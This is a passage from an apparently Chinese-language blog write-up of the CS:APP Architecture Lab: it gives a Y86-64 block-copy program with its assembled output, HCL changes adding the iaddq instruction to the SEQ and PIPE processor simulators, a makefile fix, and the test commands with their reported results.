class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">	.pos 0</span><br><span class="line">	irmovq stack,%rsp</span><br><span class="line">	call main</span><br><span class="line">	halt</span><br><span class="line">	</span><br><span class="line">	.align 8</span><br><span class="line"># Source block</span><br><span class="line">src:</span><br><span class="line">	.quad 0x00a</span><br><span class="line">	.quad 0x0b0</span><br><span class="line">	.quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">	.quad 0x111</span><br><span class="line">	.quad 0x222</span><br><span class="line">	.quad 0x333</span><br><span class="line">	</span><br><span class="line">main:</span><br><span class="line">	irmovq src,%rdi		# %rdi = src</span><br><span class="line">	irmovq dest,%rsi	# %rsi = dest</span><br><span class="line">	irmovq $3,%rdx		# %rdx = 3</span><br><span class="line">	call copy_block		# 调用 copy_block</span><br><span class="line">	ret</span><br><span class="line">	</span><br><span class="line">copy_block:</span><br><span class="line">	xorq %rax,%rax		# %rax = 0</span><br><span class="line">	irmovq $8,%r8		# %r8 = 8</span><br><span class="line">	irmovq $1,%r9		# %r9 = 1</span><br><span class="line">	andq %rdx,%rdx		# 测试 %rdx 是否大于 0</span><br><span class="line">	jmp test			# 直接跳转到 test</span><br><span class="line">	</span><br><span class="line">loop:</span><br><span class="line">	mrmovq (%rdi),%rbx	# %rbx = *(%rdi)</span><br><span class="line">	addq %r8,%rdi		# %rdi += 8</span><br><span class="line">	rmmovq %rbx,(%rsi)	# *(%rsi) = %rbx</span><br><span class="line">	addq %r8,%rsi		# %rsi += 8</span><br><span class="line">	xorq %rbx,%rax		# %rax ^= %rbx</span><br><span class="line">	subq %r9,%rdx		# %rbx -= 1</span><br><span class="line">test:</span><br><span class="line">	jg loop				# 如果 %rdx 大于 0，跳转到 loop</span><br><span class="line">	ret</span><br><span class="line"></span><br><span class="line">	.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>
+
+<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><ul>
+<li>创建 copy.ys 文件，写入上述汇编代码</li>
+<li>通过命令 <strong>.&#x2F;yas copy.ys</strong> 得到 copy.yo 文件，汇编结果如下</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">0x000:                      | 	.pos 0</span><br><span class="line">0x000: 30f40002000000000000 | 	irmovq stack,%rsp</span><br><span class="line">0x00a: 804800000000000000   | 	call main</span><br><span class="line">0x013: 00                   | 	halt</span><br><span class="line">                            | 	</span><br><span class="line">0x018:                      | 	.align 8</span><br><span class="line">                            | # Source block</span><br><span class="line">0x018:                      | src:</span><br><span class="line">0x018: 0a00000000000000     | 	.quad 0x00a</span><br><span class="line">0x020: b000000000000000     | 	.quad 0x0b0</span><br><span class="line">0x028: 000c000000000000     | 	.quad 0xc00</span><br><span class="line">                            | # Destination block</span><br><span class="line">0x030:                      | dest:</span><br><span class="line">0x030: 1101000000000000     | 	.quad 0x111</span><br><span class="line">0x038: 2202000000000000     | 	.quad 0x222</span><br><span class="line">0x040: 3303000000000000     | 	.quad 0x333</span><br><span class="line">                            | 	</span><br><span class="line">0x048:                      | main:</span><br><span class="line">0x048: 30f71800000000000000 | 	irmovq src,%rdi	# %rdi = src</span><br><span class="line">0x052: 30f63000000000000000 | 	irmovq dest,%rsi	# %rsi = dest</span><br><span class="line">0x05c: 30f20300000000000000 | 	irmovq $3,%rdx		# %rdx = 3</span><br><span class="line">0x066: 807000000000000000   | 	call copy_block	# 调用 copy_block</span><br><span class="line">0x06f: 90                   | 	ret</span><br><span class="line">                            | 	</span><br><span class="line">0x070:                      | copy_block:</span><br><span class="line">0x070: 6300                 | 	xorq %rax,%rax		# %rax = 0</span><br><span class="line">0x072: 30f80800000000000000 | 	irmovq $8,%r8		# %r8 = 8</span><br><span class="line">0x07c: 30f90100000000000000 | 	irmovq $1,%r9		# %r9 = 1</span><br><span class="line">0x086: 6222                 | 	andq %rdx,%rdx		# 测试 %rdx 是否大于 0</span><br><span class="line">0x088: 70ad00000000000000   | 	jmp test		# 直接跳转到 test</span><br><span class="line">                            | 	</span><br><span class="line">0x091:                      | loop:</span><br><span class="line">0x091: 50370000000000000000 | 	mrmovq (%rdi),%rbx	# %rbx = *(%rdi)</span><br><span class="line">0x09b: 6087                 | 	addq %r8,%rdi		# %rdi += 8</span><br><span class="line">0x09d: 40360000000000000000 | 	rmmovq %rbx,(%rsi)	# *(%rsi) = %rbx</span><br><span class="line">0x0a7: 6086                 | 	addq %r8,%rsi		# %rsi += 8</span><br><span class="line">0x0a9: 6330                 | 	xorq %rbx,%rax		# %rax ^= %rbx</span><br><span class="line">0x0ab: 6192                 | 	subq %r9,%rdx		# %rbx -= 1</span><br><span class="line">0x0ad:                      | test:</span><br><span class="line">0x0ad: 769100000000000000   | 	jg loop		# 如果 %rdx 大于 0，跳转到 loop</span><br><span class="line">0x0b6: 90                   | 	ret</span><br><span class="line">                            | </span><br><span class="line">0x200:                      | 	.pos 0x200</span><br><span class="line">0x200:                      | stack:</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>.&#x2F;yis copy.yo</strong> 运行程序</li>
+</ul>
+<h2 id="Result-2"><a href="#Result-2" class="headerlink" title="Result"></a>Result</h2><ul>
+<li><strong>运行结果</strong></li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240316171806273.png" class="" title="image-20240316171806273">
+
+<ul>
+<li>%rax &#x3D;&#x3D; 0x0cba，结果正确</li>
+</ul>
+<h1 id="Part-B"><a href="#Part-B" class="headerlink" title="Part B"></a>Part B</h1><ul>
+<li>在这一部分中，您将在目录 <strong>sim&#x2F;seq</strong> 中工作</li>
+<li>B 部分中的任务是扩展 SEQ 处理器以支持 iaddq，即将立即数和寄存器相加</li>
+<li>要添加此说明，您将修改文件 <strong>seq-full.hcl</strong>，该文件实现了 CS：APP3e 教科书中描述的 SEQ 版本</li>
+<li>我们根据 SEQ 设计的 iaddq 各阶段实现如下</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># 取指	</span><br><span class="line">	icdoe:ifun	&lt;-	M1[PC]</span><br><span class="line">		rA:rB	&lt;-	M1[PC + 1]</span><br><span class="line">    	valC	&lt;-	M8[PC + 2]</span><br><span class="line">   		valP	&lt;-	PC + 10</span><br><span class="line"># 译码</span><br><span class="line">		valB	&lt;-	R[rB]</span><br><span class="line"># 执行</span><br><span class="line">		valE	&lt;-	valC + valB</span><br><span class="line"># 访存</span><br><span class="line"></span><br><span class="line"># 写回</span><br><span class="line">		r[rB]	&lt;-	valE</span><br><span class="line"># 更新 PC</span><br><span class="line">		  PC	&lt;-	valP</span><br></pre></td></tr></table></figure>
+
+<h2 id="修改-seq-full-hcl-文件"><a href="#修改-seq-full-hcl-文件" class="headerlink" title="修改 seq-full.hcl 文件"></a>修改 seq-full.hcl 文件</h2><ul>
+<li><p>注意在 HCL 描述中添加 iaddq 时要大写，且要加上前缀 I，即写成 <strong>IIADDQ</strong></p>
+</li>
+<li><p>取指阶段</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">################ Fetch Stage ###################################</span><br><span class="line"></span><br><span class="line"># Determine instruction code</span><br><span class="line">word icode = [</span><br><span class="line">	imem_error: INOP;</span><br><span class="line">	1: imem_icode;		# Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Determine instruction function</span><br><span class="line">word ifun = [</span><br><span class="line">	imem_error: FNONE;</span><br><span class="line">	1: imem_ifun;		# Default: get from instruction memory</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">bool instr_valid = icode in 	# IADDQ 是一个合法的 Y86-64 指令,要加上</span><br><span class="line">	&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte? 获取的指令是否需要 regid 字节？</span><br><span class="line">bool need_regids =		# IADDQ 有寄存器指示符字节，要加上</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word? 获取指令需要常数字吗？</span><br><span class="line">bool need_valC =		# IADDQ 需要常数字，要加上</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>译码和写回阶段</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">################ Decode Stage ###################################	</span><br><span class="line"></span><br><span class="line">## What register should be used as the A source? 什么寄存器应该用作 A 源？Don&#x27;t need</span><br><span class="line">word srcA = [</span><br><span class="line">	icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : rA;</span><br><span class="line">	icode in &#123; IPOPQ, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE; # Don&#x27;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the B source? 应该使用什么寄存器作为 B 源？ rB</span><br><span class="line">word srcB = [</span><br><span class="line">	icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t need register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the E destination? 应该使用什么寄存器作为 E 目标？ rB</span><br><span class="line">word dstE = [</span><br><span class="line">	icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">	icode in &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## What register should be used as the M destination? 应该使用什么寄存器作为 M 目标？ Don&#x27;t need</span><br><span class="line">word dstM = [</span><br><span class="line">	icode in &#123; IMRMOVQ, IPOPQ &#125; : rA;</span><br><span class="line">	1 : RNONE;  # Don&#x27;t write any register</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>执行阶段</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">################ Execute Stage ###################################	</span><br><span class="line"></span><br><span class="line">## Select input A to ALU 选择输入 A 到 ALU 	valC</span><br><span class="line">word aluA = [</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC;</span><br><span class="line">	icode in &#123; ICALL, IPUSHQ &#125; : -8;</span><br><span class="line">	icode in &#123; IRET, IPOPQ &#125; : 8;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select input B to ALU 选择输入 B 到 ALU 	valB</span><br><span class="line">word aluB = [</span><br><span class="line">	icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">		      IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span><br><span class="line">	icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;</span><br><span class="line">	# Other instructions don&#x27;t need ALU</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Set the ALU function 设置 ALU 函数	默认 ALUADD 就行</span><br><span class="line">word alufun = [</span><br><span class="line">	icode == IOPQ : ifun;</span><br><span class="line">	1 : ALUADD;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Should the condition codes be updated? 是否应该更新条件代码？ Yes</span><br><span class="line">bool set_cc = icode in &#123; IOPQ, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>访存阶段</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">################ Memory Stage ################################### </span><br><span class="line"></span><br><span class="line">## Set read control signal 设置读取控制信号 Don&#x27;t need</span><br><span class="line">bool mem_read = icode in &#123; IMRMOVQ, IPOPQ, IRET &#125;;</span><br><span class="line"></span><br><span class="line">## Set write control signal 设置写控制信号 Don&#x27;t need</span><br><span class="line">bool mem_write = icode in &#123; IRMMOVQ, IPUSHQ, ICALL &#125;;</span><br><span class="line"></span><br><span class="line">## Select memory address 选择内存地址 Don&#x27;t need</span><br><span class="line">word mem_addr = [</span><br><span class="line">	icode in &#123; IRMMOVQ, IPUSHQ, ICALL, IMRMOVQ &#125; : valE;</span><br><span class="line">	icode in &#123; IPOPQ, IRET &#125; : valA;</span><br><span class="line">	# Other instructions don&#x27;t need address</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Select memory input data 选择内存输入数据 Don&#x27;t need</span><br><span class="line">word mem_data = [</span><br><span class="line">	# Value from register</span><br><span class="line">	icode in &#123; IRMMOVQ, IPUSHQ &#125; : valA;</span><br><span class="line">	# Return PC</span><br><span class="line">	icode == ICALL : valP;</span><br><span class="line">	# Default: Don&#x27;t write anything</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Determine instruction status 确定指令状态 Don&#x27;t need</span><br><span class="line">word Stat = [</span><br><span class="line">	imem_error || dmem_error : SADR;</span><br><span class="line">	!instr_valid: SINS;</span><br><span class="line">	icode == IHALT : SHLT;</span><br><span class="line">	1 : SAOK;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>更新 PC</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">################ Program Counter Update ############################ </span><br><span class="line"></span><br><span class="line">## What address should instruction be fetched at 指令应该在什么地址获取 valP</span><br><span class="line"></span><br><span class="line">word new_pc = [</span><br><span class="line">	# Call.  Use instruction constant</span><br><span class="line">	icode == ICALL : valC;</span><br><span class="line">	# Taken branch.  Use instruction constant</span><br><span class="line">	icode == IJXX &amp;&amp; Cnd : valC;</span><br><span class="line">	# Completion of RET instruction.  Use value from stack</span><br><span class="line">	icode == IRET : valM;</span><br><span class="line">	# Default: Use incremented PC</span><br><span class="line">	1 : valP;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul>
+<li>在通过命令 <strong>make VERSION&#x3D;full</strong> 构建新的模拟器时可能会出现一些错误，需要修改 makefile 文件</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240317155152677.png" class="" title="image-20240317155152677">
+
+<ul>
+<li>修改 makefile 文件为如下内容</li>
+</ul>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Modify this line to indicate the default version to build</span></span><br><span class="line"></span><br><span class="line">VERSION=full 	<span class="comment"># VERSION=std</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Comment this out if you don&#x27;t have Tcl/Tk on your system</span></span><br><span class="line"></span><br><span class="line">GUIMODE=-Wall -O2 -DUSE_INTERP_RESULT	<span class="comment"># -DHAS_GUI</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过命令 <strong>.&#x2F;ssim -t ..&#x2F;y86-code&#x2F;asumi.yo</strong> 在简单的 Y86-64 程序上测试您的解决方案，运行结果如下：Succeeds</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240317160830202.png" class="" title="image-20240317160830202">
+
+<ul>
+<li>通过命令 <strong>(cd ..&#x2F;y86-code; make testssim)</strong> 使用基准测试程序重新测试解决方案。一旦您的模拟器能够正确执行小程序，您就可以在 Y86-64 基准测试程序上自动对其进行测试，运行结果如下：Succeeds</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240317161012790.png" class="" title="image-20240317161012790">
+
+<ul>
+<li>通过命令 <strong>(cd ..&#x2F;ptest; make SIM&#x3D;..&#x2F;seq&#x2F;ssim)</strong> 执行回归检验。一旦您可以正确执行基准测试程序，那么您应该测试除 iaddq 和 leave 之外的所有内容，运行结果如下：Succeeds</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240317161222277.png" class="" title="image-20240317161222277">
+
+<ul>
+<li>通过命令 <strong>(cd ..&#x2F;ptest; make SIM&#x3D;..&#x2F;seq&#x2F;ssim TFLAGS&#x3D;-i)</strong> 测试 iaddq 的实现，运行结果如下：Succeeds</li>
+</ul>
+<img src="/2024/03/16/CSAPP-Lab4/image-20240317161345939.png" class="" title="image-20240317161345939">
+
+<h1 id="Part-C"><a href="#Part-C" class="headerlink" title="Part C"></a>Part C</h1><ul>
+<li>您将在这部分的目录 <strong>sim&#x2F;pipe</strong> 中工作</li>
+<li>ncopy 函数将一个 len 元素整数数组 src 复制到一个不重叠的 dst，返回 src 中包含的正整数数的计数</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">2 * ncopy - copy src to dst, returning number of positive ints</span></span><br><span class="line"><span class="comment">3 * contained in src array.</span></span><br><span class="line"><span class="comment">4 */</span></span><br><span class="line"><span class="number">5</span> <span class="type">word_t</span> <span class="title function_">ncopy</span><span class="params">(<span class="type">word_t</span> *src, <span class="type">word_t</span> *dst, <span class="type">word_t</span> len)</span></span><br><span class="line">6 &#123;</span><br><span class="line"><span class="number">7</span>		<span class="type">word_t</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="number">8</span>		<span class="type">word_t</span> val;</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span>		<span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">11</span>			val = *src++;</span><br><span class="line"><span class="number">12</span>			*dst++ = val;</span><br><span class="line"><span class="number">13</span>			<span class="keyword">if</span> (val &gt; <span class="number">0</span>)</span><br><span class="line"><span class="number">14</span>				count++;</span><br><span class="line"><span class="number">15</span>			len--;</span><br><span class="line"><span class="number">16</span>		&#125;</span><br><span class="line"><span class="number">17</span>		<span class="keyword">return</span> count;</span><br><span class="line"><span class="number">18</span> &#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>您在 C 部分中的任务是修改 ncopy.ys 和 pipe-full.hcl，通过在 pipe-full.hcl 中实现 iaddq 的 PIPE 版本，使 ncopy.ys 尽可能快地运行</li>
+<li>讲义中的一些说明<ul>
+<li>您将提交两个文件：pipe-full.hcl 和 ncopy.ys</li>
+<li>ncopy.ys 函数必须适用于任意数组大小</li>
+<li>ncopy.ys 函数必须与 YIS 一起正确运行。ncopy 文件的汇编版本长度不得超过 1000 字节</li>
+</ul>
+</li>
+</ul>
+<h2 id="修改-pipe-full-hcl-文件"><a href="#修改-pipe-full-hcl-文件" class="headerlink" title="修改 pipe-full.hcl 文件"></a>修改 pipe-full.hcl 文件</h2><ul>
+<li>思路和 SEQ 版本的类似</li>
+<li>取指阶段</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">################ Fetch Stage     ################################### 取指</span><br><span class="line"></span><br><span class="line">## What address should instruction be fetched at 指令应该在什么地址获取 default</span><br><span class="line">word f_pc = [</span><br><span class="line">	# Mispredicted branch.  Fetch at incremented PC</span><br><span class="line">	M_icode == IJXX &amp;&amp; !M_Cnd : M_valA;</span><br><span class="line">	# Completion of RET instruction</span><br><span class="line">	W_icode == IRET : W_valM;</span><br><span class="line">	# Default: Use predicted value of PC</span><br><span class="line">	1 : F_predPC;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">## Determine icode of fetched instruction 确定获取指令的 icode default</span><br><span class="line">word f_icode = [</span><br><span class="line">	imem_error : INOP;</span><br><span class="line">	1: imem_icode;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Determine ifun default</span><br><span class="line">word f_ifun = [</span><br><span class="line">	imem_error : FNONE;</span><br><span class="line">	1: imem_ifun;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Is instruction valid? 指令是否有效？ Yes</span><br><span class="line">bool instr_valid = f_icode in </span><br><span class="line">	&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">	  IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Determine status code for fetched instruction 确定获取指令的状态代码 default</span><br><span class="line">word f_stat = [</span><br><span class="line">	imem_error: SADR;</span><br><span class="line">	!instr_valid : SINS;</span><br><span class="line">	f_icode == IHALT : SHLT;</span><br><span class="line">	1 : SAOK;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a regid byte? 获取的指令是否需要 regid 字节？ Yes</span><br><span class="line">bool need_regids =</span><br><span class="line">	f_icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Does fetched instruction require a constant word? 获取指令需要常数字吗？ Yes</span><br><span class="line">bool need_valC =</span><br><span class="line">	f_icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br><span class="line"></span><br><span class="line"># Predict next value of PC 预测 PC 的下一个价值 default</span><br><span class="line">word f_predPC = [</span><br><span class="line">	f_icode in &#123; IJXX, ICALL &#125; : f_valC;</span><br><span class="line">	1 : f_valP;</span><br><span class="line">];</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>译码和写回阶段</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">################ Decode Stage ###################################### 译码和写回阶段</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## What register should be used as the A source? 什么寄存器应该用作 A 源？ Don&#x27;t need</span><br><span class="line">word d_srcA = [</span><br><span class="line">	D_icode in &#123; IRRMOVQ, IRMMOVQ, IOPQ, IPUSHQ  &#125; : D_rA;</span><br><span class="line">	D_icode in &#123; IPOPQ, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE; # Don&#x27;t need register</span><br><span class="line">];</span><br><span 